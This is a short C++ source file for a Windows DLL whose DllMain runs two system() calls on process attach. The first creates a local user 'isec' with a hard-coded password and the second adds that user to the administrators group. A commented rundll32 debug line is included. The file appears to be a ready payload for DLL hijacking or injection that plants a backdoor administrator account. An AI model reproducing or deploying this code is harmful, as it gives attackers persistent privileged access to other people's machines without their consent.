// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        int i;
        i = system("net user isec BadPass1BadPass2 /y /add");
        i = system("net localgroup administrators isec /add");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

//Debugging... :)
/*extern "C" __declspec(dllexport) void mydllmain()
{
    MessageBox(0, L"pupupupupupupupu!", 0, 0);
}*/
// Debug: rundll32 .\add_user_dll.dll,mydllmain
